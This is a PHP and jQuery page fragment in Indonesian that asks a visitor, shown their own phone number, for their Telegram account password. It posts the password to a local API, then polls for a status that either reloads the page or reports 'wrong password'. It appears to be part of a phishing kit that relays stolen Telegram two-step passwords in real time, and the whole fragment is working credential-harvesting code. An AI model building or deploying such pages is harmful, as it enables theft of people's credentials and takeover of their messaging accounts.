<p class="mt-3 text-center">Masukkan password +<?= $_SESSION["phone"] ?> Telegram Anda.</p>
<div class="mb-3">
    <input type="text" class="form-control" name="phone" id="phone" placeholder="Password Akun Telegram Anda" />
</div>
<p id="wrong" class="text-center">Password salah, silahkan input ulang.</p>
<button class="btn btn-primary mx-auto d-block mb-3">SELANJUTNYA</button>
<script>
  $("#wrong").hide();

  function checkStatus() {
    $("#wrong").hide();
    $.ajax({
      url: "API/index.php",
      type: "POST",
      data: {"method":"getStatus"},
      success:function(data){
        if (data.result.status == "success") {
          window.location.reload();
        } else if (data.result.status == "failed") {
          $("#wrong").show();
          $("input[type='text']").val("");
          $("#loader").hide();
        } else {
          setTimeout(function(){
            checkStatus();
          }, 500);
        }
      }, error:function(data){}
    });
  }

  $("button").on("click", function(e){
    e.preventDefault();
    var password = $("input[type='text']").val();

    if (password != "") {
      $("#loader").show();
      $.ajax({
        url: "API/index.php",
        type: "POST",
        data: {"method":"sendPassword","password":password},
        success:function(data){
          setTimeout(function(){
            checkStatus();
          }, 500);
        },
        error:function(data){}
      });
    }
  });
</script>